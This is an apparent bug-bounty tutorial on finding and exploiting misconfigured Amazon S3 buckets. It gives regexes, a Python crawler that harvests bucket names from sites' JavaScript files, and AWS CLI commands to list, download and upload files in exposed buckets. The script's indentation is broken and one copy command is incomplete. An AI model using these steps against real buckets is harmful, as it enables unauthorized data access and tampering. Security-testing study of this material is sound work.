# What Is An Amazon S3 Bucket?
Is a public static cloud file storage resource available in Amazon Web Services’ (AWS) Simple Storage Service (S3), an object storage offering. S3 buckets, are similar to file folders, store objects, which consist of data and its descriptive metadata.

# The Weakest Link
- Many web developers use this service to host files like JavaScript, HTML, image, CSS.
```bash
.s3.amazonaws.com/js/main.js
```

- developers configure unnecessary policies and configuration for public users. This can leads to unauthorized file access, upload, and delete.
# How to Exploit This?
* Step 1 :
- Create amazon accound. Get Your Access Key and Secret Key
```bash
pip install aws-cli #or pip install awscli
aws configure
# It will ask you for an access key and secret key. Just add the previously made keys.
```

* Step 2 :
```bash
https://bucket-name.s3.Region.amazonaws.com/ #key name
https://my-bucket.s3.us-west-2.amazonaws.com/puppy.png
```
- my-bucket is bucket name
- puppy.png is the key name
- Us-west is the bucket region

## Regex
```bash
[\w\-\.]+\.s3\.?(?:[\w\-\.]+)?\.amazonaws\.com|
(?<!\.)s3\.?(?:[\w\-\.]+)?\.amazonaws\.com\\?\/[\w\-\.]+
```
- Regex To Detect S3 buckets

## JavaScript
- Most s3 buckets are hiding inside JavaScript files
- Find JS Paths
```bash
(?<=src=[‘\”])[a-zA-Z0–9_\.\-\:\/]+\.js
```

### Python Script Fo Automation
```python 
import requests,re
from urllib.parse import unquote
import checkdomains
domains = open("Domains-to-test.txt","r")
for domain in domains.readlines():
    subdomains = open(domain.rstrip("\n")+"_subdomains.txt","r")
    for subdomain in subdomains.readlines():
        buckets = []
        urls = checkdomains.isdomainlive(subdomain.rstrip("\n"))
        if urls:
           for url in urls:
              print("checking - "+url)
              try:
                 html=requests.get(url=url,timeout=20,verify=False).content
                 try:
                   html=unquote(str(html))
                 except Exception as e:
                        print(e)
                 regjs=r"(?<=src=['\"])[a-zA-Z0-9_\.\-\:\/]+\.js"
                 regs3=r"[\w\-\.]+\.s3\.?(?:[\w\-\.]+)?\.amazonaws\.com|(?<!\.)s3\.?(?:[\w\-\.]+)?\.amazonaws\.com\\?\/[\w\-\.]+"
                 js=re.findall(regjs,html)
                 s3=re.findall(regs3,html)
                 buckets=buckets+s3
                 if len(js)>0:
                   for i  in js:
                       if i.startswith('//'):
                          jsurl=i.replace('//','http://')
                       elif i.startswith('http'):
                          jsurl=i
                       else:
                          jsurl=url+'/'+i
                       try:
                          jsfile=requests.get(jsurl,timeout=20).content
                          s3=re.findall(regs3,jsfile)
                       except Exception as y:
                             pass
                       if s3:
                         buckets=buckets+s3
              except Exception as x:
                    pass
                for bucket in buckets:
                      print(bucket)
```


# Exploitation
- To test any found buckets, open your Terminal and run the following commands.
```bash
aws s3 ls s3://whateverbucketname
```
- Check for any sensitive files presence, and if there is any, try to download it to your box
```bash
aws s3 cp s3://whateverbucketname/secret.txt
```
- You can also upload files, to do this just run,
```bash
aws s3 mv Exploit.txt s3://whateverbucketname/
```

- [WriteUp](https://infosecwriteups.com/finding-and-exploiting-s3-amazon-buckets-for-bug-bounties-6b782872a6c4)

